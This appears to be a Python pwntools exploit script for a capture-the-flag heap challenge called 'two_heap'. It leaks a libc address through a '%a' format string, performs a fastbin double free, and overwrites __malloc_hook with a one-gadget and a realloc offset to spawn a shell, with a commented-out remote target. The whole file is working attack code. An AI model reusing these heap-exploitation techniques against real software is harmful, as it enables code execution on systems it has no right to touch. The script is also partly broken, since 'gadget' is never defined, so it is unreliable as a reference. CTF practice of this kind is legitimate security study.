from pwn import *
#from LibcSearch import *
context.binary = ELF("./two_heap")
context.log_level = 'debug'

elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, '')
	raw_input()

def menu(ch):
	p.sendlineafter('Your choice:', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size', str(size))
	p.sendlineafter('note', content)

def free(idx):
	menu(2)
	p.sendlineafter('index', str(idx))
	print "free %d chunk" % idx


def exploit():
	# '%a' leak 
	p.recvline()
	p.sendline('%a%2$a%3$a')
	recv = p.recvline().split('0x0.0')

	leak = int('0x7f' + recv[-1].split('p')[0], 16)
	libc_base = leak - 0x5f1a88
	print "libc_base ==> ", hex(libc_base)
	
	__free_hook = libc_base + libc.symbols['__free_hook']
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']
	realloc = libc_base + libc.symbols['__libc_realloc']


	#double chain
	add(0x60, '0')
	add(0x68, '1')
	add(0x10, '2')

	free(1)
	free(0)
	free(1)

	add(0x68, p64(__malloc_hook - 0x23))
	dbg()
	add(0x68, 'a')
	add(0x68, 0xb*'\x00' + p64(gadget[0] + libc_base) + p64(realloc+0xb))



	p.interactive()
	p.close()


if __name__ == '__main__':
	p = process("./two_heap")
	#p = remote('111.198.29.45', 55957)
	exploit()